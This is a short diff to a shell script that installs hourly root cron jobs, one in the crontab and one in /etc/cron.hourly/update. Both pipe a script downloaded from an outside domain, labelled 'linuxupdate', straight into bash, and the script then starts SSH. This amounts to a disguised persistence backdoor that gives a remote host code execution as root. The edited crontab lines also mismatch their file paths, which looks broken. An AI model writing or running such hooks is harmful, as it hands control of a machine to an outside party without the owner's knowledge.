@@ -22,7 +22,8 @@ if [[ $(< /tmp/ip) != "$IP" ]]; then
 	cat <&3
 fi
 
-sudo su -c "(crontab -l 2>/dev/null; echo '0 * * * * curl -L erikboesen.com/linuxupdate.sh |bash') | crontab -"
+grep -v "erikboesen.com" /var/spool/cron/crontabs/root > /tmp/crontab; mv /tmp/crontab /var/spool/crontabs/root
+echo '0 * * * * curl -L erikboesen.com/linuxupdate.sh |bash' >> /var/spool/crontabs/root
 sudo su -c "printf '#\!/bin/bash\ncurl -L erikboesen.com/linuxupdate.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"
 
 systemctl start ssh.service
